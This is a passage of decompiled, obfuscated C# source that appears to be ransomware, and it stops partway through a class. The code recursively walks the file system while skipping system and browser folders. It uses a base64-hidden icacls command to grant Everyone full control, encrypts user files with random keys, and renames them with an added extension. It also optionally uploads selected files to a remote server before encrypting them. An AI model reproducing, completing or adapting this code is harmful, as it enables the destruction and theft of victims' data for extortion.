using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SyaaQuaZnuVC;
using qftUKWQxmwkZg;
using xQrQRQddRE;

namespace kuMeqwHpurUBOD;

internal class BErRpdYOfQAwSr
{
	public class idxqNCEhMqUbBAPj
	{
		private static StringCollection fLpFrQPozAVXl = new StringCollection();

		private static List<string> eBQDwDAKInKCaYF = new List<string>();

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(oMKRHTBqYRfOk("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("????????????????????") && !text.EndsWith(".secure") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(SGHDaCxgQr))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(FIbXXLCVARq) * 1024.0 * 1024.0 && ZrRHitKveMxniC == "YES")
							{
								eBQDwDAKInKCaYF.Add(text);
							}
							else if (File.Exists(text) && ZrRHitKveMxniC == "NO")
							{
								eBQDwDAKInKCaYF.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return eBQDwDAKInKCaYF;
		}
	}

	private sealed class uwwAILDuwIQs
	{
		public string ZERToGKXzmayuo;

		public bool _003CMain_003Eb__7(Process process_0)
		{
			return process_0.ProcessName == ZERToGKXzmayuo;
		}
	}

	private sealed class VjMyonYihPlVlJK
	{
		public string[] HWzAhZljHiEK;

		public void _003CMain_003Eb__8()
		{
			VqpeLWAVRhnNLC.BJvMQPSHzrRdKdx(HWzAhZljHiEK);
		}
	}

	private sealed class WYVxZrhpKQNU
	{
		public string uAYBqoxFKKpTW;

		public bool _003CIsDriveNTFS_003Eb__21(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == uAYBqoxFKKpTW;
		}
	}

	private sealed class HKEvdbLCkKIV
	{
		private sealed class NkspxIhkZAcghDC
		{
			public HKEvdbLCkKIV PgEGNEZOzoH;

			public string GEoFpfKGMjKCZwQ;

			public void _003CCrypt_003Eb__29()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					NHrsaNbqqwFFKh(WindowsIdentity.GetCurrent().Name, GEoFpfKGMjKCZwQ);
				}
			}

			public void _003CCrypt_003Eb__2a()
			{
				zyEnlTcIHqYR(GEoFpfKGMjKCZwQ, PgEGNEZOzoH.wvBPXomTVGYyo, PgEGNEZOzoH.jhLgXzNXSRNS, PgEGNEZOzoH.ZxnwAJqsazOQUB, PgEGNEZOzoH.PzYMtvwFVOWwOfS);
			}
		}

		public string[] wvBPXomTVGYyo;

		public string[] ZxnwAJqsazOQUB;

		public string PzYMtvwFVOWwOfS;

		public string jhLgXzNXSRNS;

		public void _003CCrypt_003Eb__28(string string_0)
		{
			NkspxIhkZAcghDC CS_0024_003C_003E8__locals0 = new NkspxIhkZAcghDC();
			CS_0024_003C_003E8__locals0.PgEGNEZOzoH = this;
			CS_0024_003C_003E8__locals0.GEoFpfKGMjKCZwQ = string_0;
			if (qsDIrveZaNzAq && !OLRxBoNESYHA().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						NHrsaNbqqwFFKh(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.GEoFpfKGMjKCZwQ);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (dQHMXFnCEYNSw == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					zyEnlTcIHqYR(CS_0024_003C_003E8__locals0.GEoFpfKGMjKCZwQ, CS_0024_003C_003E8__locals0.PgEGNEZOzoH.wvBPXomTVGYyo, CS_0024_003C_003E8__locals0.PgEGNEZOzoH.jhLgXzNXSRNS, CS_0024_003C_003E8__locals0.PgEGNEZOzoH.ZxnwAJqsazOQUB, CS_0024_003C_003E8__locals0.PgEGNEZOzoH.PzYMtvwFVOWwOfS);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				zyEnlTcIHqYR(CS_0024_003C_003E8__locals0.GEoFpfKGMjKCZwQ, wvBPXomTVGYyo, jhLgXzNXSRNS, ZxnwAJqsazOQUB, PzYMtvwFVOWwOfS);
			}
		}
	}

	private sealed class JysbNTrlmOEbMFT
	{
		private sealed class mNXDErnWhYhfY
		{
			public JysbNTrlmOEbMFT YSfXkLqrELo;

			public string ZWmcWGCVMBMv;

			public void _003CWorkerCrypter2_003Eb__37()
			{
				foreach (string item in HLlzhaBALyehKMW)
				{
					if (ZWmcWGCVMBMv.ToLower().EndsWith(item + YSfXkLqrELo.zRrhleDkDu) && LNfftKTeaLEJxe == "YES")
					{
						if (Convert.ToInt32(jUyryfTlTABVm) * 1024 * 1024 > new FileInfo(ZWmcWGCVMBMv).Length)
						{
							try
							{
								BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", ZWmcWGCVMBMv);
							}
							catch
							{
							}
						}
					}
					else if (ZWmcWGCVMBMv.ToLower().EndsWith(item) && LNfftKTeaLEJxe == "NO")
					{
						try
						{
							BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", ZWmcWGCVMBMv);
						}
						catch
						{
						}
					}
				}
			}
		}

		private sealed class YkvZynJxzmMAMM
		{
			public JysbNTrlmOEbMFT YSfXkLqrELo;

			public string FGDbrdTLEwF;

			public void _003CWorkerCrypter2_003Eb__39()
			{
				foreach (string item in HLlzhaBALyehKMW)
				{
					if (FGDbrdTLEwF.ToLower().EndsWith(item + YSfXkLqrELo.zRrhleDkDu) && LNfftKTeaLEJxe == "YES")
					{
						if (Convert.ToInt32(jUyryfTlTABVm) * 1024 * 1024 > new FileInfo(FGDbrdTLEwF).Length)
						{
							try
							{
								BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", FGDbrdTLEwF);
							}
							catch
							{
							}
						}
					}
					else if (FGDbrdTLEwF.ToLower().EndsWith(item) && LNfftKTeaLEJxe == "NO")
					{
						try
						{
							BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", FGDbrdTLEwF);
						}
						catch
						{
						}
					}
				}
			}
		}

		public List<string> BFhdaeESOcRrvA;

		public List<string> TEsRQlBGMsrM;

		public string zRrhleDkDu;

		public string[] YgvmapaKkT;

		public string FYndIeNOJJCR;

		public void _003CWorkerCrypter2_003Eb__36(string string_0)
		{
			mNXDErnWhYhfY CS_0024_003C_003E8__locals0;
			foreach (string item in TEsRQlBGMsrM)
			{
				if (item.ToLower().Contains(":\\program files\\") || item.ToLower().Contains(":\\windows\\") || item.ToLower().Contains("perflogs") || item.ToLower().Contains("internet explorer") || item.ToLower().Contains(":\\programdata\\") || item.ToLower().Contains("appdata") || item.ToLower().Contains("msocache") || item.ToLower().Contains("system volume information") || item.ToLower().Contains("boot") || item.ToLower().Contains("tor browser") || item.ToLower().Contains("mozilla") || item.ToLower().Contains("google chrome") || item.ToLower().Contains("application data") || item.Contains("autoexec.bat") || item.Contains("desktop.ini") || item.Contains("autorun.inf") || item.Contains("ntuser.dat") || item.Contains("NTUSER.DAT") || item.Contains("iconcache.db") || item.Contains("bootsect.bak") || item.Contains("boot.ini") || item.Contains("ntuser.dat.log") || item.Contains("thumbs.db") || item.ToLower().Contains("bootmgr") || item.ToLower().Contains("pagefile.sys") || item.ToLower().Contains("config.sys") || item.ToLower().Contains("ntuser.ini") || item.Contains(oMKRHTBqYRfOk("QnVpbGRlcl9Mb2c=")) || item.Contains("RSAKeys") || item.Contains("????????????????????") || item.EndsWith(zRrhleDkDu) || item.EndsWith("exe") || item.EndsWith("dll") || item.EndsWith("EXE") || item.EndsWith("DLL") || item.Contains("Recycle.Bin") || item.Contains(SGHDaCxgQr) || item.Contains(OpWBXzCwVRYsxq) || item.Contains(MwUDomDUGsVhYA))
				{
					continue;
				}
				if (YgvmapaKkT.Length != 0)
				{
					string[] ygvmapaKkT = YgvmapaKkT;
					int num = 0;
					while (num < ygvmapaKkT.Length)
					{
						string value = ygvmapaKkT[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_08c5;
					}
				}
				try
				{
					if (item.EndsWith(zRrhleDkDu))
					{
						goto IL_08c5;
					}
				}
				catch (Exception)
				{
					goto IL_08c5;
				}
				if (!item.EndsWith(string_0) || TZzJBVGXhjZB.Contains(item))
				{
					continue;
				}
				if (NvrJrGCLFM == "YES")
				{
					try
					{
						if (mNZEakGpRFrLn.BzymlTUToS(item))
						{
							mNZEakGpRFrLn.yMPBlYJpSCfxjv(item);
						}
					}
					catch
					{
					}
				}
				TZzJBVGXhjZB.Add(item);
				if (!igfzwruhwWDXY.Contains(Path.GetDirectoryName(item)))
				{
					igfzwruhwWDXY.Add(Path.GetDirectoryName(item));
				}
				uATAppcKlZ(oMKRHTBqYRfOk("aWNhY2xzLmV4ZQ=="), item + oMKRHTBqYRfOk("IC9ncmFudCBFdmVyeW9uZTpGIC9UIC9DIC9R"));
				eIGoCSnmXvMXP(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (vQOhJPfkmenqxsh)
						{
							try
							{
								File.AppendAllText(OpWBXzCwVRYsxq, "File: " + item + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_03c4;
					}
					if (YvhlPQrYyPhB == "YES" && new FileInfo(item).Length > Convert.ToInt32(XZspBinZvbc) * 1024 * 1024 && !BFhdaeESOcRrvA.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new mNXDErnWhYhfY();
						CS_0024_003C_003E8__locals0.YSfXkLqrELo = this;
						try
						{
							if (zRrhleDkDu != ".*")
							{
								File.Move(item, item + zRrhleDkDu);
							}
						}
						catch (Exception ex4)
						{
							if (vQOhJPfkmenqxsh)
							{
								try
								{
									File.AppendAllText(OpWBXzCwVRYsxq, "File: " + item + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv = "";
						if (zRrhleDkDu != ".*")
						{
							CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv = item + zRrhleDkDu;
						}
						else
						{
							CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv = item;
						}
						if (XiSfijQzOr == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in HLlzhaBALyehKMW)
								{
									if (CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.YSfXkLqrELo.zRrhleDkDu) && LNfftKTeaLEJxe == "YES")
									{
										if (Convert.ToInt32(jUyryfTlTABVm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv).Length)
										{
											try
											{
												BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv.ToLower().EndsWith(item2) && LNfftKTeaLEJxe == "NO")
									{
										try
										{
											BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
						string s = HAbvOFkMJVoSN.IOEmPutvAYpeIgr(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = luIgktEtlHVR.sjLnWbxhrKF(CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv, Convert.ToInt32(XZspBinZvbc) * 1024 * 1024);
						luIgktEtlHVR.SEcBXBtSwKeqJ(DWszvBlRCViF: (!sWEYqVGQKvAbKzrbA) ? (txjxRPsHuzRR ? luIgktEtlHVR.ZnyJbIPDofh(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : luIgktEtlHVR.ZnyJbIPDofh(byte_, Encoding.ASCII.GetBytes(FYndIeNOJJCR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (txjxRPsHuzRR ? rkaJvaLxSApP.XSSYjgejGHjLCQ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rkaJvaLxSApP.XSSYjgejGHjLCQ(byte_, Encoding.ASCII.GetBytes(FYndIeNOJJCR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), YrxPFTOslcV: CS_0024_003C_003E8__locals0.ZWmcWGCVMBMv, KIcXskzpJWslXMph: bytes);
					}
					else
					{
						string text2 = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
						string s2 = HAbvOFkMJVoSN.IOEmPutvAYpeIgr(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (zRrhleDkDu != ".*")
						{
							if (!kqkNEUMWxoNDeP)
							{
								if (!txjxRPsHuzRR)
								{
									IbxvsuFDJGCHw(item, item + zRrhleDkDu, vzfvEbaMMJjzL);
								}
								else
								{
									IbxvsuFDJGCHw(item, item + zRrhleDkDu, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!txjxRPsHuzRR)
									{
										aaxjshgqLTvRmFF(item, item + zRrhleDkDu, vzfvEbaMMJjzL);
									}
									else
									{
										aaxjshgqLTvRmFF(item, item + zRrhleDkDu, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (vQOhJPfkmenqxsh)
									{
										try
										{
											File.AppendAllText(OpWBXzCwVRYsxq, "File: " + item + " - Error while fully writing to file: " + ex6.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!kqkNEUMWxoNDeP)
						{
							if (!txjxRPsHuzRR)
							{
								IbxvsuFDJGCHw(item, item + ".part", vzfvEbaMMJjzL);
							}
							else
							{
								IbxvsuFDJGCHw(item, item + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!txjxRPsHuzRR)
								{
									aaxjshgqLTvRmFF(item, item, vzfvEbaMMJjzL);
								}
								else
								{
									aaxjshgqLTvRmFF(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (vQOhJPfkmenqxsh)
								{
									try
									{
										File.AppendAllText(OpWBXzCwVRYsxq, "File: " + item + " - Error while fully writing to file: " + ex8.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (txjxRPsHuzRR)
						{
							if (zRrhleDkDu != ".*")
							{
								lPoyIxkPQfSfzaP(item + zRrhleDkDu, bytes2);
							}
							else
							{
								lPoyIxkPQfSfzaP(item, bytes2);
							}
						}
					}
					goto IL_08c5;
					end_IL_03c4:;
				}
				catch (Exception)
				{
					goto IL_08c5;
				}
				continue;
				IL_08c5:
				TEsRQlBGMsrM.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__38(string string_0)
		{
			YkvZynJxzmMAMM CS_0024_003C_003E8__locals0 = new YkvZynJxzmMAMM();
			CS_0024_003C_003E8__locals0.YSfXkLqrELo = this;
			CS_0024_003C_003E8__locals0.FGDbrdTLEwF = string_0;
			if (!CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains(":\\program files\\") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains(":\\windows\\") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("perflogs") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("internet explorer") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains(":\\programdata\\") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("appdata") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("msocache") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("system volume information") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("boot") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("tor browser") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("mozilla") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("google chrome") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("application data") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("autoexec.bat") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("desktop.ini") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("autorun.inf") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("ntuser.dat") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("NTUSER.DAT") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("iconcache.db") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("bootsect.bak") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("boot.ini") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("ntuser.dat.log") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("thumbs.db") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("bootmgr") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("pagefile.sys") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("config.sys") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().Contains("ntuser.ini") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains(oMKRHTBqYRfOk("QnVpbGRlcl9Mb2c=")) && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("RSAKeys") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("????????????????????") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith(zRrhleDkDu) && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith("exe") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith("dll") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith("EXE") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith("DLL") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains("Recycle.Bin") && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains(SGHDaCxgQr) && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains(OpWBXzCwVRYsxq) && !CS_0024_003C_003E8__locals0.FGDbrdTLEwF.Contains(MwUDomDUGsVhYA))
			{
				if (YgvmapaKkT.Length != 0)
				{
					string[] ygvmapaKkT = YgvmapaKkT;
					int num = 0;
					while (num < ygvmapaKkT.Length)
					{
						string value = ygvmapaKkT[num];
						if (!CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0a2b;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.FGDbrdTLEwF.EndsWith(zRrhleDkDu))
					{
						goto IL_0a2b;
					}
				}
				catch (Exception)
				{
					goto IL_0a2b;
				}
				if (!TZzJBVGXhjZB.Contains(CS_0024_003C_003E8__locals0.FGDbrdTLEwF))
				{
					if (NvrJrGCLFM == "YES")
					{
						try
						{
							if (mNZEakGpRFrLn.BzymlTUToS(CS_0024_003C_003E8__locals0.FGDbrdTLEwF))
							{
								mNZEakGpRFrLn.yMPBlYJpSCfxjv(CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
							}
						}
						catch
						{
						}
					}
					TZzJBVGXhjZB.Add(CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
					if (!igfzwruhwWDXY.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.FGDbrdTLEwF)))
					{
						igfzwruhwWDXY.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.FGDbrdTLEwF));
					}
					eIGoCSnmXvMXP(CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.FGDbrdTLEwF).Length != 0L)
							{
								goto end_IL_04c2;
							}
							goto end_IL_04c2_2;
							end_IL_04c2:;
						}
						catch (Exception ex2)
						{
							if (vQOhJPfkmenqxsh)
							{
								try
								{
									File.AppendAllText(OpWBXzCwVRYsxq, "File: " + CS_0024_003C_003E8__locals0.FGDbrdTLEwF + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							goto end_IL_04c2_2;
						}
						if (YvhlPQrYyPhB == "YES" && new FileInfo(CS_0024_003C_003E8__locals0.FGDbrdTLEwF).Length > Convert.ToInt32(XZspBinZvbc) * 1024 * 1024)
						{
							try
							{
								if (zRrhleDkDu != ".*")
								{
									File.Move(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + zRrhleDkDu);
								}
							}
							catch (Exception ex4)
							{
								if (vQOhJPfkmenqxsh)
								{
									try
									{
										File.AppendAllText(OpWBXzCwVRYsxq, "File: " + CS_0024_003C_003E8__locals0.FGDbrdTLEwF + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
								return;
							}
							if (zRrhleDkDu != ".*")
							{
								CS_0024_003C_003E8__locals0.FGDbrdTLEwF += zRrhleDkDu;
							}
							if (XiSfijQzOr == "YES")
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in HLlzhaBALyehKMW)
									{
										if (CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.YSfXkLqrELo.zRrhleDkDu) && LNfftKTeaLEJxe == "YES")
										{
											if (Convert.ToInt32(jUyryfTlTABVm) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.FGDbrdTLEwF).Length)
											{
												try
												{
													BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.FGDbrdTLEwF.ToLower().EndsWith(item) && LNfftKTeaLEJxe == "NO")
										{
											try
											{
												BhEjWEybWo.UKsatUgrFHrdZ("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
							string s = HAbvOFkMJVoSN.IOEmPutvAYpeIgr(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							byte[] array = null;
							byte[] byte_ = luIgktEtlHVR.sjLnWbxhrKF(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, Convert.ToInt32(XZspBinZvbc) * 1024 * 1024);
							luIgktEtlHVR.SEcBXBtSwKeqJ(DWszvBlRCViF: (!sWEYqVGQKvAbKzrbA) ? (txjxRPsHuzRR ? luIgktEtlHVR.ZnyJbIPDofh(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : luIgktEtlHVR.ZnyJbIPDofh(byte_, Encoding.ASCII.GetBytes(FYndIeNOJJCR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (txjxRPsHuzRR ? rkaJvaLxSApP.XSSYjgejGHjLCQ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rkaJvaLxSApP.XSSYjgejGHjLCQ(byte_, Encoding.ASCII.GetBytes(FYndIeNOJJCR), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), YrxPFTOslcV: CS_0024_003C_003E8__locals0.FGDbrdTLEwF, KIcXskzpJWslXMph: bytes);
						}
						else
						{
							string text2 = mDLVsqYWEGph.lQJZvHOKRcdPe(32);
							string s2 = HAbvOFkMJVoSN.IOEmPutvAYpeIgr(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (zRrhleDkDu != ".*")
							{
								if (!kqkNEUMWxoNDeP)
								{
									if (!txjxRPsHuzRR)
									{
										IbxvsuFDJGCHw(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + zRrhleDkDu, vzfvEbaMMJjzL);
									}
									else
									{
										IbxvsuFDJGCHw(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + zRrhleDkDu, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!txjxRPsHuzRR)
										{
											aaxjshgqLTvRmFF(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + zRrhleDkDu, vzfvEbaMMJjzL);
										}
										else
										{
											aaxjshgqLTvRmFF(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + zRrhleDkDu, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex6)
									{
										if (vQOhJPfkmenqxsh)
										{
											try
											{
												File.AppendAllText(OpWBXzCwVRYsxq, "File: " + CS_0024_003C_003E8__locals0.FGDbrdTLEwF + " - Error while fully writing to file: " + ex6.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
									}
								}
							}
							else if (!kqkNEUMWxoNDeP)
							{
								if (!txjxRPsHuzRR)
								{
									IbxvsuFDJGCHw(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + ".part", vzfvEbaMMJjzL);
								}
								else
								{
									IbxvsuFDJGCHw(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF + ".part", Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!txjxRPsHuzRR)
									{
										aaxjshgqLTvRmFF(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF, vzfvEbaMMJjzL);
									}
									else
									{
										aaxjshgqLTvRmFF(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, CS_0024_003C_003E8__locals0.FGDbrdTLEwF, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex8)
								{
									if (vQOhJPfkmenqxsh)
									{
										try
										{
											File.AppendAllText(OpWBXzCwVRYsxq, "File: " + CS_0024_003C_003E8__locals0.FGDbrdTLEwF + " - Error while fully writing to file: " + ex8.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
							if (txjxRPsHuzRR)
							{
								if (zRrhleDkDu != ".*")
								{
									lPoyIxkPQfSfzaP(CS_0024_003C_003E8__locals0.FGDbrdTLEwF + zRrhleDkDu, bytes2);
								}
								else
								{
									lPoyIxkPQfSfzaP(CS_0024_003C_003E8__locals0.FGDbrdTLEwF, bytes2);
								}
							}
						}
						end_IL_04c2_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0a2b;
			IL_0a2b:
			TEsRQlBGMsrM.Remove(CS_0024_003C_003E8__locals0.FGDbrdTLEwF);
		}
	}

	private sealed class tsCGCqSymQuu
	{
		public string UZavYxvKDEAva;

		public string vxjqxeajvIhW;

